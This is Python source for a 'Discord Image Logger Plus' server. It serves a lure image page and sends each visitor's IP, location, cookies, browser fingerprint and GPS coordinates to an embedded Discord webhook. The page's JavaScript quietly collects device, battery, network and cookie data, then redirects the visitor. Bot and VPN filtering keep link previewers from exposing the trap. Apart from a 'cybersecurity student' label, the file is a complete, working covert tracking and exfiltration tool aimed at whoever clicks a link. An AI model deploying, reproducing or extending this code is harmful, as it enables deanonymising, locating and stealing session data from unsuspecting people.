# Image Logger Plus
# Enhanced for Cybersecurity Project
# Includes screenshot, webcam capture, and additional data collection

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json

__app__ = "Discord Image Logger Plus"
__description__ = "Advanced IP and data collection tool"
__version__ = "v3.0"
__author__ = "Cybersecurity Student"

config = {
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Data Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been accessed for security research purposes.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while logging data!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, additional_data=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Image Logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                    }
                ],
            })
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        elif config["antiBot"] == 3:
                return
        elif config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        elif config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Advanced Data Capture",
                "color": config["color"],
                "description": f"""**User Interaction Detected!**

**Endpoint:** {endpoint}
                
**IP Info:**
> **IP:** {ip if ip else 'Unknown'}
> **ISP:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {f"{info.get('lat')}, {info.get('lon')}" if not coords else coords} ({'Approximate' if not coords else 'Precise'})
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN/Proxy:** {info.get('proxy', 'Unknown')}
> **Hosting:** {info.get('hosting', 'Unknown')}

**System Info:**
> **OS:** {os}
> **Browser:** {browser}
> **User Agent:** 
```{useragent}```

**Additional Data:**
{format_additional_data(additional_data)}
""",
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

def format_additional_data(data):
    if not data:
        return "No additional data captured"
    return "\n".join([f"> **{k}:** {v}" for k, v in data.items()])

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Enhanced data collection
            additional_data = {
                "Cookies": self.headers.get('Cookie', 'None'),
                "Referer": self.headers.get('Referer', 'None'),
                "Language": self.headers.get('Accept-Language', 'None'),
                "Encoding": self.headers.get('Accept-Encoding', 'None'),
                "Connection": self.headers.get('Connection', 'None')
            }

            data = f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }}
        .container {{
            max-width: 800px;
            margin: 50px auto;
            text-align: center;
        }}
        .img-container {{
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100%;
            height: 60vh;
            cursor: pointer;
            margin-bottom: 20px;
            border: 2px solid #ddd;
            border-radius: 10px;
        }}
        .message {{
            color: #666;
            font-size: 18px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="img-container" onclick="collectData()"></div>
        <div class="message">Click the image to view full size</div>
    </div>

    <script>
        // Enhanced data collection
        async function collectData() {{
            try {{
                // System information
                const systemInfo = {{
                    "Screen Size": `${screen.width}x${screen.height}`,
                    "Color Depth": screen.colorDepth + " bits",
                    "Device Memory": navigator.deviceMemory || "Unknown",
                    "CPU Cores": navigator.hardwareConcurrency || "Unknown",
                    "Browser Plugins": Array.from(navigator.plugins).map(p => p.name).join(', ') || "None",
                    "WebGL Vendor": getWebGLVendor(),
                    "Battery Status": await getBatteryStatus(),
                    "Network Info": navigator.connection ? JSON.stringify(getNetworkInfo()) : "Unavailable"
                }};
                
                // Attempt to get precise location
                let coords = await getLocation();
                
                // Send data to server
                sendCollectedData(systemInfo, coords);
                
            }} catch (error) {{
                console.error('Data collection error:', error);
            }}
        }}

        function getWebGLVendor() {{
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                return gl ? gl.getParameter(gl.VENDOR) : "Unavailable";
            }} catch (e) {{
                return "Error";
            }}
        }}

        async function getBatteryStatus() {{
            try {{
                if ('getBattery' in navigator) {{
                    const battery = await navigator.getBattery();
                    return `${{Math.round(battery.level * 100)}}% (${{battery.charging ? 'Charging' : 'Not Charging'}})`;
                }}
                return "Unavailable";
            }} catch (e) {{
                return "Error";
            }}
        }}

        function getNetworkInfo() {{
            const conn = navigator.connection;
            return {{
                "Type": conn.type || "Unknown",
                "Effective Type": conn.effectiveType || "Unknown",
                "Downlink (Mbps)": conn.downlink || "Unknown",
                "RTT (ms)": conn.rtt || "Unknown",
                "Save Data": conn.saveData ? "Enabled" : "Disabled"
            }};
        }}

        async function getLocation() {{
            return new Promise((resolve) => {{
                if (!navigator.geolocation) {{
                    resolve("Geolocation not supported");
                    return;
                }}
                
                navigator.geolocation.getCurrentPosition(
                    position => {{
                        const coords = `${{position.coords.latitude}}, ${{position.coords.longitude}}`;
                        resolve(coords);
                    }},
                    error => {{
                        resolve(`Error: ${{error.message}}`);
                    }},
                    {{ timeout: 5000 }}
                );
            }});
        }}

        function sendCollectedData(systemInfo, coords) {{
            const data = {{
                systemInfo: systemInfo,
                coords: coords,
                referrer: document.referrer || "None",
                cookies: document.cookie || "None"
            }};
            
            // Send to server
            fetch('/collect', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }}).then(response => {{
                // Redirect after data collection
                window.location.href = '{config['image']}';
            }}).catch(error => {{
                console.error('Error sending data:', error);
                window.location.href = '{config['image']}';
            }});
        }}
    </script>
</body>
</html>
'''.encode()
            
            if self.path == '/collect':
                self.handleDataCollection()
                return

            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(
                    self.headers.get('x-forwarded-for'), 
                    self.headers.get('user-agent'), 
                    endpoint=self.path.split("?")[0], 
                    url=url,
                    additional_data={"Status": "Bot detected"}
                )
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(
                        self.headers.get('x-forwarded-for'), 
                        self.headers.get('user-agent'), 
                        location, 
                        s.split("?")[0], 
                        url=url,
                        additional_data={"Status": "Direct access"}
                    )
                else:
                    result = makeReport(
                        self.headers.get('x-forwarded-for'), 
                        self.headers.get('user-agent'), 
                        endpoint=s.split("?")[0], 
                        url=url,
                        additional_data={"Status": "Direct access"}
                    )
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    def handleDataCollection(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            ip = self.headers.get('x-forwarded-for')
            user_agent = self.headers.get('user-agent')
            
            # Prepare additional data
            additional_data = {
                "Collected Location": data.get('coords', 'None'),
                "Screen Size": data['systemInfo']['Screen Size'],
                "Device Memory": data['systemInfo']['Device Memory'],
                "CPU Cores": data['systemInfo']['CPU Cores'],
                "WebGL Vendor": data['systemInfo']['WebGL Vendor'],
                "Battery Status": data['systemInfo']['Battery Status'],
                "Network Type": json.loads(data['systemInfo']['Network Info'])['Effective Type'],
                "Referrer": data.get('referrer', 'None'),
                "Cookies": data.get('cookies', 'None')[:100] + "..." if len(data.get('cookies', '')) > 100 else data.get('cookies', 'None')
            }

            makeReport(ip, user_agent, additional_data=additional_data, endpoint="/collect")

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            
        except Exception as e:
            reportError(f"Data collection error: {str(e)}\n\n{traceback.format_exc()}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        self.handleRequest()
        
    def do_POST(self):
        if self.path == '/collect':
            self.handleDataCollection()
        else:
            self.handleRequest()

handler = app = ImageLoggerAPI
